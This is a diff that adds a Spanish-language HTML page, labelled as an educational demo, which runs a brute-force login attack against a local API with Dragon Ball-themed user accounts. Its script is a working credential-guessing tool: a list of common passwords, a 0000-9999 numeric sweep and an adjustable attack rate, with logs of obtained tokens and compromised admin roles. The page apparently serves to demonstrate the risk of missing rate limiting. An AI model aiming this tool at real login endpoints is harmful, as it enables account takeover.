@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>⚠️ Ataque de Fuerza Bruta - DEMO</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Courier New", monospace;
+        background: #000;
+        color: #00ff00;
+        padding: 20px;
+        min-height: 100vh;
+      }
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+      h1 {
+        color: #ff0000;
+        text-align: center;
+        margin-bottom: 10px;
+        font-size: 2.5em;
+        text-shadow: 0 0 10px #ff0000;
+      }
+      .warning {
+        background: #ff0000;
+        color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        margin-bottom: 30px;
+        text-align: center;
+        font-weight: bold;
+        animation: blink 1s infinite;
+      }
+      @keyframes blink {
+        0%,
+        50% {
+          opacity: 1;
+        }
+        25%,
+        75% {
+          opacity: 0.5;
+        }
+      }
+      .attack-panel {
+        background: #1a1a1a;
+        border: 2px solid #00ff00;
+        border-radius: 10px;
+        padding: 30px;
+        margin-bottom: 20px;
+      }
+      .form-group {
+        margin-bottom: 20px;
+      }
+      label {
+        display: block;
+        margin-bottom: 8px;
+        color: #00ff00;
+        font-weight: bold;
+      }
+      input,
+      select {
+        width: 100%;
+        padding: 12px;
+        background: #000;
+        border: 2px solid #00ff00;
+        color: #00ff00;
+        border-radius: 5px;
+        font-family: "Courier New", monospace;
+        font-size: 14px;
+      }
+      input:focus,
+      select:focus {
+        outline: none;
+        box-shadow: 0 0 10px #00ff00;
+      }
+      button {
+        width: 100%;
+        padding: 15px;
+        background: #ff0000;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s;
+        font-family: "Courier New", monospace;
+        margin-bottom: 10px;
+      }
+      button:hover {
+        background: #cc0000;
+        box-shadow: 0 0 20px #ff0000;
+        transform: scale(1.05);
+      }
+      button:disabled {
+        background: #666;
+        cursor: not-allowed;
+        box-shadow: none;
+        transform: none;
+      }
+      button.stop {
+        background: #ff6600;
+      }
+      .stats {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 15px;
+        margin-bottom: 20px;
+      }
+      .stat-card {
+        background: #1a1a1a;
+        border: 2px solid #00ff00;
+        border-radius: 8px;
+        padding: 15px;
+        text-align: center;
+      }
+      .stat-value {
+        font-size: 2em;
+        font-weight: bold;
+        color: #00ff00;
+        margin: 10px 0;
+      }
+      .stat-label {
+        color: #666;
+        font-size: 0.9em;
+      }
+      .console {
+        background: #000;
+        border: 2px solid #00ff00;
+        border-radius: 8px;
+        padding: 20px;
+        max-height: 400px;
+        overflow-y: auto;
+        font-size: 0.9em;
+      }
+      .console-line {
+        margin: 5px 0;
+        padding: 5px;
+        border-left: 3px solid transparent;
+      }
+      .console-line.success {
+        color: #00ff00;
+        border-left-color: #00ff00;
+        background: rgba(0, 255, 0, 0.1);
+        font-weight: bold;
+      }
+      .console-line.error {
+        color: #ff4444;
+        border-left-color: #ff4444;
+      }
+      .console-line.info {
+        color: #00bfff;
+        border-left-color: #00bfff;
+      }
+      .console-line.warning {
+        color: #ffa500;
+        border-left-color: #ffa500;
+      }
+      .success-banner {
+        background: #00ff00;
+        color: #000;
+        padding: 20px;
+        border-radius: 10px;
+        text-align: center;
+        font-weight: bold;
+        font-size: 1.5em;
+        margin-bottom: 20px;
+        display: none;
+        animation: pulse 0.5s infinite;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+      }
+      .password-list {
+        background: #1a1a1a;
+        border: 2px solid #666;
+        border-radius: 8px;
+        padding: 15px;
+        margin-top: 20px;
+        max-height: 200px;
+        overflow-y: auto;
+      }
+      .password-list h3 {
+        color: #00ff00;
+        margin-bottom: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>⚠️ ATAQUE DE FUERZA BRUTA</h1>
+
+      <div class="warning">
+        ⚠️ DEMOSTRACIÓN EDUCATIVA - Esta herramienta demuestra la vulnerabilidad
+        de seguridad ⚠️
+      </div>
+
+      <div id="successBanner" class="success-banner">
+        🎯 ¡CONTRASEÑA ENCONTRADA! 🎯
+      </div>
+
+      <div class="attack-panel">
+        <h2>🎯 Configuración del Ataque</h2>
+
+        <div class="form-group">
+          <label>👤 Usuario Objetivo:</label>
+          <select id="targetUser">
+            <option value="goku">goku (Son Goku)</option>
+            <option value="vegeta">vegeta (Vegeta)</option>
+            <option value="gohan">gohan (Son Gohan)</option>
+            <option value="piccolo">piccolo (Piccolo)</option>
+            <option value="trunks">trunks (Trunks)</option>
+            <option value="krillin">krillin (Krillin)</option>
+            <option value="bulma">bulma (Bulma - ADMIN)</option>
+            <option value="master_roshi">
+              master_roshi (Master Roshi - ADMIN)
+            </option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>⚡ Velocidad del Ataque (ms entre intentos):</label>
+          <input
+            type="number"
+            id="attackSpeed"
+            value="100"
+            min="10"
+            max="5000"
+          />
+          <small style="color: #666"
+            >Menor = Más rápido (10ms = muy agresivo)</small
+          >
+        </div>
+
+        <div class="form-group">
+          <label>🎲 Tipo de Ataque:</label>
+          <select id="attackType">
+            <option value="demo">
+              DEMO: Contraseña correcta incluida (rápido)
+            </option>
+            <option value="common">Contraseñas Comunes (100+ passwords)</option>
+            <option value="numeric">Solo Números (0000-9999)</option>
+          </select>
+        </div>
+
+        <button id="startBtn" onclick="startAttack()">🚀 INICIAR ATAQUE</button>
+        <button
+          id="stopBtn"
+          onclick="stopAttack()"
+          class="stop"
+          style="display: none"
+        >
+          ⏹️ DETENER ATAQUE
+        </button>
+      </div>
+
+      <div class="stats">
+        <div class="stat-card">
+          <div class="stat-label">Intentos Realizados</div>
+          <div class="stat-value" id="attempts">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Intentos Fallidos</div>
+          <div class="stat-value" id="failed">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Tiempo Transcurrido</div>
+          <div class="stat-value" id="elapsed">0s</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Velocidad</div>
+          <div class="stat-value" id="speed">0/s</div>
+        </div>
+      </div>
+
+      <div class="console" id="console">
+        <div class="console-line info">
+          💻 Sistema listo. Configure el ataque y presione INICIAR ATAQUE
+        </div>
+        <div class="console-line warning">
+          🔴 VULNERABILIDAD ACTUAL: Sin límite de intentos de login
+        </div>
+      </div>
+
+      <div class="password-list">
+        <h3>📋 Diccionario de Contraseñas Comunes:</h3>
+        <div style="color: #666; font-size: 0.9em">
+          password, 123456, admin, qwerty, letmein, welcome, monkey, dragon,
+          master, iloveyou, princess, football, abc123, 111111, sunshine,
+          password123, starwars, freedom, whatever, trustno1, goku, vegeta,
+          kamehameha, saiyan, dragonball, supersaiyan, krillin, bulma, gohan,
+          trunks...
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ✅ Variables globales
+      let attackRunning = false;
+      let attackInterval = null;
+      let startTime = null;
+      let attempts = 0;
+      let failed = 0;
+      let passwordList = [];
+      let currentIndex = 0;
+
+      // 🔴 Lista de contraseñas comunes (Top 100+)
+      const commonPasswords = [
+        "password",
+        "123456",
+        "123456789",
+        "qwerty",
+        "abc123",
+        "monkey",
+        "letmein",
+        "dragon",
+        "master",
+        "welcome",
+        "freedom",
+        "whatever",
+        "qazwsx",
+        "trustno1",
+        "iloveyou",
+        "princess",
+        "admin",
+        "administrator",
+        "root",
+        "superman",
+        "hello",
+        "football",
+        "baseball",
+        "sunshine",
+        "shadow",
+        "michael",
+        "jennifer",
+        "computer",
+        "killer",
+        "mustang",
+        "tigger",
+        "charlie",
+        "jordan",
+        "austin",
+        "robert",
+        "daniel",
+        "thomas",
+        "startrek",
+        "starwars",
+        "matrix",
+        "pepper",
+        "corvette",
+        "yamaha",
+        "honda",
+        "ranger",
+        "golf",
+        "maverick",
+        "goku",
+        "vegeta",
+        "gohan",
+        "trunks",
+        "piccolo",
+        "krillin",
+        "bulma",
+        "kamehameha",
+        "saiyan",
+        "dragonball",
+        "dbz",
+        "supersaiyan",
+        "111111",
+        "000000",
+        "12345678",
+        "1234567",
+        "1234567890",
+        "password123",
+        "pass123",
+        "admin123",
+        "root123",
+        "test123",
+        "user123",
+        "demo123",
+        "password1",
+        "password2",
+        "qwerty123",
+        "abc1234",
+        "admin1",
+        "root1",
+        "1q2w3e4r",
+        "zxcvbnm",
+        "asdfgh",
+        "qweasd",
+        "1qaz2wsx",
+        "Password",
+        "Password1",
+        "Admin",
+        "Welcome1",
+        "P@ssw0rd",
+        "P@ssword",
+        "Pass@123",
+      ];
+
+      // 📊 Función para agregar logs
+      function addLog(message, type = "info") {
+        const consoleDiv = document.getElementById("console");
+        const line = document.createElement("div");
+        line.className = `console-line ${type}`;
+        const timestamp = new Date().toLocaleTimeString();
+        line.innerHTML = `[${timestamp}] ${message}`;
+        consoleDiv.appendChild(line);
+        consoleDiv.scrollTop = consoleDiv.scrollHeight;
+      }
+
+      // 🎯 Iniciar ataque
+      async function startAttack() {
+        const targetUser = document.getElementById("targetUser").value;
+        const attackSpeed = parseInt(
+          document.getElementById("attackSpeed").value
+        );
+        const attackType = document.getElementById("attackType").value;
+
+        // Resetear contadores
+        attempts = 0;
+        failed = 0;
+        currentIndex = 0;
+        startTime = Date.now();
+
+        // Preparar lista de contraseñas según el tipo
+        if (attackType === "common") {
+          passwordList = [...commonPasswords];
+        } else if (attackType === "numeric") {
+          passwordList = [];
+          for (let i = 0; i <= 9999; i++) {
+            passwordList.push(i.toString().padStart(4, "0"));
+          }
+        } else if (attackType === "demo") {
+          // DEMO: Incluir la contraseña correcta en posición aleatoria
+          passwordList = [
+            "wrong1",
+            "wrong2",
+            "incorrect",
+            "password",
+            "wrong5",
+            "notthis",
+          ];
+        }
+
+        attackRunning = true;
+        document.getElementById("startBtn").style.display = "none";
+        document.getElementById("stopBtn").style.display = "block";
+        document.getElementById("successBanner").style.display = "none";
+
+        addLog(``, "info");
+        addLog(`🎯 ═══════════════════════════════════════`, "warning");
+        addLog(`🎯 ATAQUE INICIADO contra: ${targetUser}`, "warning");
+        addLog(`⚡ Velocidad: ${attackSpeed}ms entre intentos`, "info");
+        addLog(`📋 Diccionario: ${passwordList.length} contraseñas`, "info");
+        addLog(`🔴 VULNERABILIDAD: Sin rate limiting`, "error");
+        addLog(`🎯 ═══════════════════════════════════════`, "warning");
+        addLog(``, "info");
+
+        // Iniciar ataque
+        attackInterval = setInterval(() => {
+          if (!attackRunning || currentIndex >= passwordList.length) {
+            stopAttack();
+            if (currentIndex >= passwordList.length) {
+              addLog(
+                `❌ Ataque finalizado: Contraseña no encontrada en el diccionario`,
+                "error"
+              );
+            }
+            return;
+          }
+
+          tryPassword(targetUser, passwordList[currentIndex]);
+          currentIndex++;
+          updateStats();
+        }, attackSpeed);
+      }
+
+      // 🔐 Intentar contraseña
+      async function tryPassword(username, password) {
+        attempts++;
+
+        try {
+          const response = await fetch("http://localhost:8080/api/auth/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ username, password }),
+          });
+
+          const data = await response.json();
+
+          if (response.ok && data.success) {
+            // 🎯 ¡CONTRASEÑA ENCONTRADA!
+            stopAttack();
+            addLog(``, "success");
+            addLog(`🎯 ═══════════════════════════════════════`, "success");
+            addLog(
+              `🎯 ¡ÉXITO! Contraseña encontrada: "${password}"`,
+              "success"
+            );
+            addLog(`✅ Token JWT obtenido`, "success");
+            addLog(`👤 Usuario comprometido: ${data.user.fullName}`, "success");
+            addLog(`🔑 Rol: ${data.user.role}`, "success");
+            addLog(`⚡ Poder: ${data.user.powerLevel}`, "success");
+            addLog(`🎯 ═══════════════════════════════════════`, "success");
+            addLog(``, "success");
+            document.getElementById("successBanner").style.display = "block";
+          } else {
+            failed++;
+            if (attempts % 10 === 0) {
+              addLog(
+                `❌ Intentos ${attempts}: Últimas 10 contraseñas FALLIDAS`,
+                "error"
+              );
+            }
+          }
+        } catch (error) {
+          failed++;
+          addLog(`⚠️ Error de conexión: ${error.message}`, "warning");
+        }
+      }
+
+      // ⏹️ Detener ataque
+      function stopAttack() {
+        attackRunning = false;
+        if (attackInterval) {
+          clearInterval(attackInterval);
+          attackInterval = null;
+        }
+        document.getElementById("startBtn").style.display = "block";
+        document.getElementById("stopBtn").style.display = "none";
+        addLog(`⏹️ Ataque detenido manualmente`, "warning");
+      }
+
+      // 📊 Actualizar estadísticas
+      function updateStats() {
+        document.getElementById("attempts").textContent =
+          attempts.toLocaleString();
+        document.getElementById("failed").textContent = failed.toLocaleString();
+
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        document.getElementById("elapsed").textContent = `${elapsed}s`;
+
+        const speed = elapsed > 0 ? (attempts / elapsed).toFixed(1) : 0;
+        document.getElementById("speed").textContent = `${speed}/s`;
+      }
+
+      // 🔄 Actualizar estadísticas cada segundo
+      setInterval(() => {
+        if (attackRunning) {
+          updateStats();
+        }
+      }, 1000);
+    </script>
+  </body>
+</html>
